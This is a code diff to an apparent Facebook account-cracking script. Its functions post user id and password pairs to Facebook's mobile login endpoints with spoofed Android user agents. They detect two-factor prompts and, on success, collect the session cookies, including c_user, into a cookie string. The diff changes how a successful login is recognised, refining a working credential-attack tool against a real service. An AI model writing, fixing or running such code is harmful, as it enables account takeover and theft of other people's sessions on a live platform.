@@ -1324,8 +1324,8 @@ def mbasic(uid,pwx,tl):
             }
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://touch.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=702c2f684e5cb91415ff73ea04c6b82d5580487fbd0a90975765b0adee500940'
-            po = Session.post(url, data=data, headers=headers, allow_redirects=False)
-            response = Session.cookies.get_dict().keys()
+            response = Session.post(url, data=data, headers=headers, allow_redirects=False)
+            respon = Session.cookies.get_dict().keys()
             if 'com.bloks.www.caa.login.save-credentials' in str(response.text.replace('\\', ' ')):
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
@@ -2014,9 +2014,9 @@ def d(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',}
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://m.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=702c2f684e5cb91415ff73ea04c6b82d5580487fbd0a90975765b0adee500940'
-            po = Session.post(url, data=data, cookies=cookies, headers=headers).text
-            response = Session.cookies.get_dict().keys()
-            if "c_user" in response:
+            response = Session.post(url, data=data, cookies=cookies, headers=headers)
+            respon = Session.cookies.get_dict().keys()
+            if 'com.bloks.www.caa.login.save-credentials' in str(response.text.replace('\\', ' ')):
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
